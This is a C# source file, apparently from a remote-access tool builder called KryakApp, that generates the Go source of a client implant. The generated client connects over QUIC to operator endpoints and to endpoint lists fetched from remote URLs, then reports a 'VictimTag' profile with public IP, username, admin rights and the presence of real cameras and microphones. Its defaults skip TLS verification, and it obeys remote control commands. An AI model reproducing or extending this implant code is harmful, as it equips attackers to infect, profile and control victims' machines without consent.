using System;

namespace KryakApp.Client
{
    internal class ClientSourceCode
    {
        public static string GetModCode()
        {
            return "module kryakclient\n\ngo 1.23\n\nrequire github.com/quic-go/quic-go v0.54.0\n";
        }

        public static string GetSumCode()
        {
            return @"github.com/quic-go/quic-go v0.54.0 h1:6s1YB9QotYI6Ospeiguknbp2Znb/jZYjZLRXn9kMQBg=
github.com/quic-go/quic-go v0.54.0/go.mod h1:e68ZEaCdyviluZmy44P6Iey98v/Wfz6HCjQEm+l8zTY=
go.uber.org/mock v0.5.0 h1:KAMbZvZPyBPWgD14IrIQ38QCyjwpvVVV6K/bHl1IwQU=
go.uber.org/mock v0.5.0/go.mod h1:ge71pBPLYDk7QIi1LupWxdAykm7KIEFchiOqd6z7qMM=
golang.org/x/crypto v0.26.0 h1:RrRspgV4mU+YwB4FYnuBoKsUapNIL5cohGAmSH3azsw=
golang.org/x/crypto v0.26.0/go.mod h1:GY7jblb9wI+FOo5y8/S2oY4zWP07AkOJ4+jxCqdqn54=
golang.org/x/mod v0.18.0 h1:5+9lSbEzPSdWkH32vYPBwEpX8KwDbM52Ud9xBUvNlb0=
golang.org/x/mod v0.18.0/go.mod h1:hTbmBsO62+eylJbnUtE2MGJUyE7QWk4xUqPFrRgJ+7c=
golang.org/x/net v0.28.0 h1:a9JDOJc5GMUJ0+UDqmLT86WiEy7iWyIhz8gz8E4e5hE=
golang.org/x/net v0.28.0/go.mod h1:yqtgsTWOOnlGLG9GFRrK3++bGOUEkNBoHZc8MEDWPNg=
golang.org/x/sync v0.8.0 h1:3NFvSEYkUoMifnESzZl15y791HH1qU2xm6eCJU5ZPXQ=
golang.org/x/sync v0.8.0/go.mod h1:Czt+wKu1gCyEFDUtn0jG5QVvpJ6rzVqr5aXyt9drQfk=
golang.org/x/sys v0.23.0 h1:YfKFowiIMvtgl1UERQoTPPToxltDeZfbj4H7dVUCwmM=
golang.org/x/sys v0.23.0/go.mod h1:/VUhepiaJMQUp4+oa/7Zr1D23ma6VTLIYjOOTFZPUcA=
golang.org/x/tools v0.22.0 h1:gqSGLZqv+AI9lIQzniJ0nZDRG5GBPsSi+DRNHWNz6yA=
golang.org/x/tools v0.22.0/go.mod h1:aCwcsjqvq7Yqt6TNyX7QMU2enbQ/Gt0bo6krSeEri+c=";
        }

        public static string GetClientCode(string[] ipList, string[] rawList, string clientTag, string securityMode, string pinnedFingerprint)
        {
            string ipAddresses = string.Join(", ", Array.ConvertAll(ipList, ip => $"\"{EscapeGoString(ip)}\""));
            string raws = string.Join(", ", Array.ConvertAll(rawList, raw => $"\"{EscapeGoString(raw)}\""));
            string tag = EscapeGoString(string.IsNullOrWhiteSpace(clientTag) ? "KryakClient" : clientTag.Trim());
            string mode = EscapeGoString(string.IsNullOrWhiteSpace(securityMode) ? "insecure" : securityMode.Trim().ToLowerInvariant());
            string pinned = EscapeGoString(NormalizeFingerprint(pinnedFingerprint));

            string src = $@"
package main

import (
    ""bufio""
    ""context""
    ""crypto/sha1""
    ""crypto/tls""
    ""crypto/x509""
    ""encoding/binary""
    ""encoding/hex""
    ""encoding/json""
    ""errors""
    ""fmt""
    ""io""
    ""net""
    ""net/http""
    ""os""
    ""os/exec""
    ""os/signal""
    ""strings""
    ""sync""
    ""syscall""
    ""time""

    ""github.com/quic-go/quic-go""
)

const (
    channelMain = ""main""
    channelPing = ""ping""
    channelControl = ""control""

    typeHello = ""hello""
    typePingRequest = ""ping_request""
    typePong = ""pong""
    typeCommand = ""command""
)

const securityMode = ""{mode}""
const pinnedFingerprint = ""{pinned}""

type UserPayload struct {{
    UserIPAddress    string `json:""UserIPAddress""`
    VictimTag        string `json:""VictimTag""`
    Username         string `json:""Username""`
    Country          string `json:""Country""`
    UserOS           string `json:""UserOS""`
    AdminStatus      bool   `json:""AdminStatus""`
    CameraStatus     bool   `json:""CameraStatus""`
    MicrophoneStatus bool   `json:""MicrophoneStatus""`
    Ping             string `json:""Ping""`
}}

type Message struct {{
    Channel string       `json:""Channel""`
    Type    string       `json:""Type""`
    User    *UserPayload `json:""User,omitempty""`
    PingID  string       `json:""PingId,omitempty""`
    Command string       `json:""Command,omitempty""`
}}

type streamWriter struct {{
    mu     sync.Mutex
    stream *quic.SendStream
}}

func (w *streamWriter) Write(msg Message) error {{
    w.mu.Lock()
    defer w.mu.Unlock()
    return writeFrame(w.stream, msg)
}}

type endpointManager struct {{
    mu      sync.Mutex
    started map[string]struct{{}}
}}

func newEndpointManager() *endpointManager {{
    return &endpointManager{{started: map[string]struct{{}}{{}}}}
}}

func (m *endpointManager) StartIfNew(ctx context.Context, endpoint string, onConnectFail func()) {{
    endpoint = strings.TrimSpace(endpoint)
    if endpoint == """" {{
        return
    }}

    m.mu.Lock()
    if _, exists := m.started[endpoint]; exists {{
        m.mu.Unlock()
        return
    }}

    m.started[endpoint] = struct{{}}{{}}
    m.mu.Unlock()

    go runEndpointLoop(ctx, endpoint, onConnectFail)
}}

func GetUserIp() string {{
	resp, err := http.Get(""https://api.ipify.org?format=text"")
	if err != nil {{
		return ""Unknown""
	}}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {{
		return ""Unknown""
	}}

	ip := """"
	_, err = fmt.Fscanf(resp.Body, ""%s"", &ip)
	if err != nil {{
		return ""Unknown""
	}}

	return ip
}}

func getAdminStatus() bool {{
	cmd := exec.Command(""net"", ""session"")
	err := cmd.Run()
	return err == nil
}}

func getCameraStatus() bool {{
    script := ""$virtual = @('virtual','obs','ndi','manycam','droidcam','screen capture'); "" +
        ""$devices = Get-PnpDevice -Class Camera -Status OK -ErrorAction SilentlyContinue; "" +
        ""if (-not $devices) {{ $devices = Get-PnpDevice -Class Image -Status OK -ErrorAction SilentlyContinue }}; "" +
        ""if (-not $devices) {{ exit 1 }}; "" +
        ""$real = $devices | Where-Object {{ $name = ($_.FriendlyName + ' ' + $_.InstanceId).ToLower(); -not ($virtual | Where-Object {{ $name.Contains($_) }}) }}; "" +
        ""if ($real -and $real.Count -gt 0) {{ exit 0 }} else {{ exit 1 }}""

    cmd := exec.Command(""powershell"", ""-NoProfile"", ""-NonInteractive"", ""-ExecutionPolicy"", ""Bypass"", ""-Command"", script)
    return cmd.Run() == nil
}}

func getMicrophoneStatus() bool {{
    script := ""$virtual = @('virtual','obs','ndi','manycam','voicemeeter','cable','loopback','stereo mix'); "" +
        ""$devices = Get-PnpDevice -Class AudioEndpoint -Status OK -ErrorAction SilentlyContinue; "" +
        ""if (-not $devices) {{ exit 1 }}; "" +
        ""$mics = $devices | Where-Object {{ $_.FriendlyName -match 'microphone|mic|array' -or $_.Class -eq 'AudioEndpoint' }}; "" +
        ""$real = $mics | Where-Object {{ $name = ($_.FriendlyName + ' ' + $_.InstanceId).ToLower(); -not ($virtual | Where-Object {{ $name.Contains($_) }}) }}; "" +
        ""if ($real -and $real.Count -gt 0) {{ exit 0 }} else {{ exit 1 }}""

    cmd := exec.Command(""powershell"", ""-NoProfile"", ""-NonInteractive"", ""-ExecutionPolicy"", ""Bypass"", ""-Command"", script)
    return cmd.Run() == nil
}}

func main() {{
    ipList := []string{{{ipAddresses}}}
    rawList := []string{{{raws}}}

    ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
    defer stop()

    manager := newEndpointManager()

    for _, endpoint := range ipList {{
        manager.StartIfNew(ctx, endpoint, nil)
    }}

    for _, rawURL := range rawList {{
        url := strings.TrimSpace(rawURL)
        if url == """" {{
            continue
        }}

        go runRawLoop(ctx, url, manager)
    }}

    <-ctx.Done()
}}

func runRawLoop(ctx context.Context, rawURL string, manager *endpointManager) {{
    ticker := time.NewTicker(30 * time.Second)
    defer ticker.Stop()
    refreshCh := make(chan struct{{}}, 1)

    signalRefresh := func() {{
        select {{
        case refreshCh <- struct{{}}{{}}:
        default:
        }}
    }}

    fetch := func() {{
        endpoints, err := fetchRawEndpoints(ctx, rawURL)
        if err != nil {{
            return
        }}

        for _, endpoint := range endpoints {{
            manager.StartIfNew(ctx, endpoint, signalRefresh)
        }}
    }}

    fetch()
    for {{
        select {{
        case <-ctx.Done():
            return
        case <-refreshCh:
            fetch()
        case <-ticker.C:
            fetch()
        }}
    }}
}}

func fetchRawEndpoints(ctx context.Context, rawURL string) ([]string, error) {{
    req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
    if err != nil {{
        return nil, err
    }}

    resp, err := http.DefaultClient.Do(req)
    if err != nil {{
        return nil, err
    }}
    defer resp.Body.Close()

    if resp.StatusCode < 200 || resp.StatusCode >= 300 {{
        return nil, fmt.Errorf(""raw fetch status: %d"", resp.StatusCode)
    }}

    scanner := bufio.NewScanner(resp.Body)
    scanner.Buffer(make([]byte, 1024), 1024*1024)
    endpoints := make([]string, 0)
    for scanner.Scan() {{
        line := strings.TrimSpace(scanner.Text())
        if line == """" || strings.HasPrefix(line, ""#"") {{
            continue
        }}
        endpoints = append(endpoints, line)
    }}

    if err := scanner.Err(); err != nil {{
        return nil, err
    }}

    return endpoints, nil
}}

func runEndpointLoop(ctx context.Context, endpoint string, onConnectFail func()) {{
    for {{
        select {{
        case <-ctx.Done():
            return
        default:
        }}

        if err := connectAndServe(ctx, endpoint); err != nil {{
            if onConnectFail != nil {{
                onConnectFail()
            }}

            select {{
            case <-ctx.Done():
                return
            case <-time.After(3 * time.Second):
            }}
            continue
        }}

        select {{
        case <-ctx.Done():
            return
        case <-time.After(1 * time.Second):
        }}
    }}
}}

func connectAndServe(ctx context.Context, endpoint string) error {{
    host := endpointHost(endpoint)

    tlsConfig := &tls.Config{{
        NextProtos:         []string{{""kryak""}},
        MinVersion:         tls.VersionTLS13,
        ServerName:         host,
    }}

    switch securityMode {{
    case ""insecure"":
        tlsConfig.InsecureSkipVerify = true
    case ""pinned"":
        tlsConfig.InsecureSkipVerify = true
        tlsConfig.VerifyPeerCertificate = func(rawCerts [][]byte, _ [][]*x509.Certificate) error {{
            if len(rawCerts) == 0 {{
                return errors.New(""no server certificate"")
            }}

            cert, err := x509.ParseCertificate(rawCerts[0])
            if err != nil {{
                return err
            }}

            sum := sha1.Sum(cert.Raw)
            got := strings.ToUpper(hex.EncodeToString(sum[:]))
            expected := strings.ToUpper(strings.ReplaceAll(pinnedFingerprint, "":"", """"))
            if expected == """" {{
                return errors.New(""empty pinned fingerprint"")
            }}

            if got != expected {{
                return fmt.Errorf(""pinned fingerprint mismatch"")
            }}

            return nil
        }}
    default:
    }}

    conn, err := quic.DialAddr(ctx, endpoint, tlsConfig, nil)
    if err != nil {{
        return err
    }}
    defer conn.CloseWithError(0, ""disconnect"")

    mainStream, err := conn.OpenUniStreamSync(ctx)
    if err != nil {{
        return err
    }}

    writer := &streamWriter{{stream: mainStream}}
    user := UserPayload{{
        UserIPAddress:    GetUserIp(),
        VictimTag:        ""{tag}"",
        Username:         usernameOrDefault(),
        Country:          ""Unknown"",
        UserOS:           runtimeName(),
        AdminStatus:      getAdminStatus(),
        CameraStatus:     getCameraStatus(),
        MicrophoneStatus: getMicrophoneStatus(),
        Ping:             ""0"",
    }}

    hello := Message{{Channel: channelMain, Type: typeHello, User: &user}}
    if err := writer.Write(hello); err != nil {{
        return err
    }}

    for {{
        stream, err := conn.AcceptUniStream(ctx)
        if err != nil {{
            return err
        }}

        if err := handleInboundStream(ctx, stream, writer); err != nil {{
            if errors.Is(err, context.Canceled) {{
                return nil
            }}
            return err
        }}
    }}
}}

func handleInboundStream(ctx context.Context, stream *quic.ReceiveStream, writer *streamWriter) error {{
    for {{
        msg, err := readFrame(stream)
        if err != nil {{
            if errors.Is(err, io.EOF) || errors.Is(err, io.ErrUnexpectedEOF) {{
                return nil
            }}
            return err
        }}

        if msg.Channel == channelPing && msg.Type == typePingRequest && msg.PingID != """" {{
            pong := Message{{Channel: channelMain, Type: typePong, PingID: msg.PingID}}
            if err := writer.Write(pong); err != nil {{
                return err
            }}
        }}

        if msg.Channel == channelControl && msg.Type == typeCommand {{
            switch msg.Command {{
            case ""close_client"", ""delete_client"":
                return nil
            case ""restart_client"":
                return errors.New(""restart requested"")
            }}
        }}

        select {{
        case <-ctx.Done():
            return ctx.Err()
        default:
        }}
    }}
}}

func writeFrame(stream *quic.SendStream, msg Message) error {{
    payload, err := json.Marshal(msg)
    if err != nil {{
        return err
    }}

    frame := make([]byte, 4+len(payload))
    binary.BigEndian.PutUint32(frame[:4], uint32(len(payload)))
    copy(frame[4:], payload)

    _, err = (*stream).Write(frame)
    return err
}}

func readFrame(stream *quic.ReceiveStream) (Message, error) {{
    var sizeBuf [4]byte
    if _, err := io.ReadFull(stream, sizeBuf[:]); err != nil {{
        return Message{{}}, err
    }}

    length := binary.BigEndian.Uint32(sizeBuf[:])
    if length == 0 {{
        return Message{{}}, fmt.Errorf(""invalid frame length"")
    }}

    payload := make([]byte, length)
    if _, err := io.ReadFull(stream, payload); err != nil {{
        return Message{{}}, err
    }}

    var msg Message
    if err := json.Unmarshal(payload, &msg); err != nil {{
        return Message{{}}, err
    }}

    return msg, nil
}}

func usernameOrDefault() string {{
    if user := strings.TrimSpace(os.Getenv(""USERNAME"")); user != """" {{
        return user
    }}
    return ""client""
}}

func runtimeName() string {{
    return ""windows""
}}

func endpointHost(endpoint string) string {{
    host, _, err := net.SplitHostPort(endpoint)
    if err != nil || strings.TrimSpace(host) == """" {{
        return ""localhost""
    }}

    return host
}}
";
            return src;
        }

        private static string EscapeGoString(string value)
        {
            return value.Replace("\\", "\\\\").Replace("\"", "\\\"");
        }

        private static string NormalizeFingerprint(string value)
        {
            if (string.IsNullOrWhiteSpace(value))
            {
                return string.Empty;
            }

            return value.Replace(":", string.Empty).Replace(" ", string.Empty).Trim();
        }
    }
}
